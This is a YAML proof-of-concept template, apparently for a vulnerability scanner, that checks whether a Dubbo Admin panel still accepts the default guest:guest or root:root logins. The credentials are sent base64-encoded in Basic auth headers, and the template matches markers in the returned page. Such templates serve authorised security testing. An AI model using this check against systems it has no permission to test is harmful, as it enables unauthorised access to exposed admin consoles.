detail:
  author: mumu0215(https://github.com/mumu0215)
  links:
  - https://www.cnblogs.com/wishwzp/p/9438658.html
expression: root0() || guest0()
manual: true
name: poc-yaml-dubbo-admin-default-password
rules:
  guest0:
    expression: 'response.status == 200 && response.body.bcontains(b"<title>Dubbo
      Admin</title>") && response.body.bcontains(b": guest'', ''/logout''") && response.body.bcontains(b"/sysinfo/versions")'
    request:
      cache: true
      headers:
        Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
      method: GET
      path: /
  root0:
    expression: 'response.status == 200 && response.body.bcontains(b"<title>Dubbo
      Admin</title>") && response.body.bcontains(b": root'', ''/logout''") && response.body.bcontains(b"/sysinfo/versions")'
    request:
      cache: true
      headers:
        Authorization: Basic cm9vdDpyb290
      method: GET
      path: /
transport: http
